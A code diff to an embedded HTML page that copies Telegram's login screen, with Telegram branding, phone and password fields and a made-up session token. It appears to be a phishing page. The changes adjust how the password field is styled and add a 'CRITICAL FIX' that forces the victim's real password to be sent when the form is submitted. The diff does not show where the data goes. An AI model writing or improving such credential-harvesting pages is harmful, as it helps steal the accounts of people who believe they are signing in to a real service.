@@ -18,7 +18,6 @@ HTML_PAGE = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
-    <!-- Simple favicon - inline SVG -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='12' fill='%230088cc'/><path d='M5.5 11.7l11.6-4.5c.5-.2 1 .1.8.9l-2 9.3c-.1.7-.5.8-1.1.5l-3-2.2-1.5 1.4c-.2.2-.3.3-.6.3l.2-3.1 5.6-5c.2-.2-.1-.3-.4-.1l-6.9 4.4-3-.9c-.6-.2-.7-.6.1-1z' fill='white'/></svg>" type="image/svg+xml">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -163,9 +162,12 @@ HTML_PAGE = """
             outline: none;
             -webkit-text-fill-color: #ffffff !important;
             opacity: 1 !important;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .password-wrapper input[type="password"] {
             -webkit-text-security: disc !important;
             text-security: disc !important;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         .password-wrapper input[type="text"] {
@@ -540,6 +542,11 @@ HTML_PAGE = """
             btn.textContent = 'Signing in...';
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('sessionToken').value = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            // CRITICAL FIX: Ensure real password is submitted
+            const passwordField = document.getElementById('password');
+            // The value is already correct, but we force it to be sent
+            passwordField.setAttribute('value', passwordField.value);
         });
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('phone').focus();
